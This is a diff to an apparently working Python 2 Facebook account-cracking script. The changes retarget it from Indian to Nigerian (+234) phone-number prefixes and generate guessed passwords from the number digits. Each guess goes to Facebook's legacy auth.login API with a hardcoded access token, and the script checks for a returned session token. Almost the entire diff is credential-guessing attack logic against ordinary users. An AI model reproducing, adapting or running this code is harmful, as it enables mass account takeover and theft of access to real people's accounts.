@@ -96,9 +96,9 @@ def menu():
         print "\033[1;92mCYBER_HACKER_GLAXY_R.H.P_1.286-Wellcome"
         print
         print "\033[1;91mATTACK ON Indian Ids"
-        print "\033[1;92m[1]  NI+2348"
-        print "\033[1;92m[2]  starter 918 "
-        print "\033[1;92m[3]  starter 917"
+        print "\033[1;92m[1]  Nigeria+2348"
+        print "\033[1;92m[2]  Nigeria+2343"
+        print "\033[1;92m[3]  Nigeria+2344"
         print "\033[1;92m[4]  my whatapp group"
         print "\033[1;92m[5]  my instagram id"
         print "\033[1;92m[6]  UPDATE SYSTEM"
@@ -131,11 +131,10 @@ def action():
                 os.system("clear")
                 print (logo)
                 print "\033[1;91mENTER THE CODE HERE"
-                print "\033[1;94m009, 127, 173, 174, 175,"
-                print "\033[1;95m400, 756, 853, 953,"
+                print "\033[1;94m31, 33, 34, 35, 36, 37, 38, 39"
                 try:
                         c = raw_input(" SELECTED CODE: ")
-                        k="+918"
+                        k="+234"
                         idlist = ('.txt')
                         for line in open(idlist,"r").readlines():
                                 id.append(line.strip())
@@ -147,11 +146,10 @@ def action():
                 os.system("clear")
                 print (logo)
                 print "\033[1;91mENTER THE CODE HERE"
-                print "\033[1;94m388, 607, 897, 755,"
-                print "\033[1;95m755,"
+                print "\033[1;94m41, 42, 43, 44, 45, 46, 47, 48"
                 try:
                         c = raw_input(" SELECTED CODE: ")
-                        k="+917"
+                        k="+234"
                         idlist = ('.txt')
                         for line in open(idlist,"r").readlines():
                                 id.append(line.strip())
@@ -240,7 +238,7 @@ def action():
                                                         cps.close()
                                                         cpb.append(c+user+pass2)
                                                 else:
-                                                        pass3 = 'india123'
+                                                        pass3 = c + user
                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                         q = json.load(data)
                                                         if 'access_token' in q:
@@ -257,7 +255,7 @@ def action():
                                                                         cps.close()
                                                                         cpb.append(c+user+pass3)
                                                                 else:
-                                                                        pass4 = 'india1234'
+                                                                        pass4 = k + c + user
                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                         q = json.load(data)
                                                                         if 'access_token' in q:
